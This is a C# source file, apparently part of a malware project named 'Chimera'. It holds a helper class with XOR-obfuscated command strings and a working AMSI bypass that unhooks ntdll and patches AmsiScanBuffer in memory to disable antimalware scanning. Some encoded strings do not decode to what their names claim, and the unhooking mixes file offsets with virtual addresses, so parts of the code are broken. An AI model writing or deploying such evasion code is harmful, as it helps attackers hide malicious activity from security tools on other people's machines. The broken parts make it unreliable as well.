using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace Chimera
{
    public static class StringHelper
    {
        private static readonly byte XorKey = 0x41;

        public static string Decode(byte[] encoded)
        {
            byte[] decoded = new byte[encoded.Length];
            for (int i = 0; i < encoded.Length; i++)
                decoded[i] = (byte)(encoded[i] ^ XorKey);
            return System.Text.Encoding.UTF8.GetString(decoded);
        }

        public static readonly byte[] CMD      = { 0x22, 0x2C, 0x25, 0x60, 0x65, 0x60, 0x65 };
        public static readonly byte[] PS       = { 0x31, 0x2E, 0x36, 0x65, 0x32, 0x29, 0x65,
                                                    0x60, 0x63, 0x63, 0x60, 0x2D, 0x65, 0x60, 0x65 };
        public static readonly byte[] SLASH_C  = { 0x6E, 0x22 };
        public static readonly byte[] POST     = { 0x11, 0x2E, 0x13, 0x15 };
        public static readonly byte[] GET      = { 0x16, 0x24, 0x15 };

        // ---------------------------------------------------------------
        // AMSI + NTDLL UNHOOK (fixed offset calculation)
        // ---------------------------------------------------------------
        public static void BypassAMSI()
        {
            UnhookNtdll();
            PatchAmsi();
        }

        private static void UnhookNtdll()
        {
            try
            {
                string ntdllPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.System),
                    "ntdll.dll");
                var freshBytes = File.ReadAllBytes(ntdllPath);
                IntPtr hNtdll = GetModuleHandle("ntdll.dll");
                if (hNtdll == IntPtr.Zero) return;

                // Read DOS header
                var dos = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(hNtdll);
                if (dos.e_magic != 0x5A4D) return;

                // Read NT headers
                IntPtr ntHeadersPtr = hNtdll + dos.e_lfanew;
                var ntSignature = Marshal.ReadInt32(ntHeadersPtr);
                var fileHeader = Marshal.PtrToStructure<IMAGE_FILE_HEADER>(ntHeadersPtr + 4);

                // The size of the optional header follows the file header in NT headers
                uint sectionHeadersOffset = (uint)(dos.e_lfanew + 4 /* Signature */ + Marshal.SizeOf<IMAGE_FILE_HEADER>() + fileHeader.SizeOfOptionalHeader);

                uint textBase = 0, textSize = 0;
                for (int i = 0; i < fileHeader.NumberOfSections; i++)
                {
                    IntPtr sectionPtr = hNtdll + (int)sectionHeadersOffset + i * Marshal.SizeOf<IMAGE_SECTION_HEADER>();
                    var sec = Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(sectionPtr);
                    string name = System.Text.Encoding.ASCII.GetString(sec.Name).TrimEnd('\0');
                    if (name == ".text")
                    {
                        textBase = sec.VirtualAddress;
                        textSize = sec.VirtualSize;
                        break;
                    }
                }

                if (textBase == 0 || textSize == 0) return;

                uint oldProtect;
                VirtualProtect(hNtdll + (int)textBase, textSize, 0x40, out oldProtect);
                Marshal.Copy(freshBytes, (int)textBase, hNtdll + (int)textBase, (int)textSize);
                VirtualProtect(hNtdll + (int)textBase, textSize, oldProtect, out _);
            }
            catch { }
        }

        private static void PatchAmsi()
        {
            try
            {
                IntPtr amsi = LoadLibrary("amsi.dll");
                if (amsi == IntPtr.Zero) return;
                IntPtr AmsiScanBufferPtr = GetProcAddress(amsi, "AmsiScanBuffer");
                if (AmsiScanBufferPtr == IntPtr.Zero) return;

                byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                uint old;
                VirtualProtect(AmsiScanBufferPtr, (uint)patch.Length, 0x40, out old);
                Marshal.Copy(patch, 0, AmsiScanBufferPtr, patch.Length);
                VirtualProtect(AmsiScanBufferPtr, (uint)patch.Length, old, out _);
            }
            catch { }
        }

        // P/Invoke – only ONE declaration of VirtualProtect
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        // Structs
        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_DOS_HEADER
        {
            public UInt16 e_magic;
            public UInt16 e_cblp, e_cp, e_crlc, e_cparhdr, e_minalloc, e_maxalloc, e_ss, e_sp, e_csum, e_ip, e_cs, e_lfarlc, e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public UInt16[] e_res;
            public UInt32 e_oemid, e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)] public UInt16[] e_res2;
            public UInt32 e_lfanew;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_SECTION_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public byte[] Name;
            public UInt32 VirtualSize;
            public UInt32 VirtualAddress;
            public UInt32 SizeOfRawData;
            public UInt32 PointerToRawData;
            public UInt32 PointerToRelocations;
            public UInt32 PointerToLinenumbers;
            public UInt16 NumberOfRelocations;
            public UInt16 NumberOfLinenumbers;
            public UInt32 Characteristics;
        }
    }
}
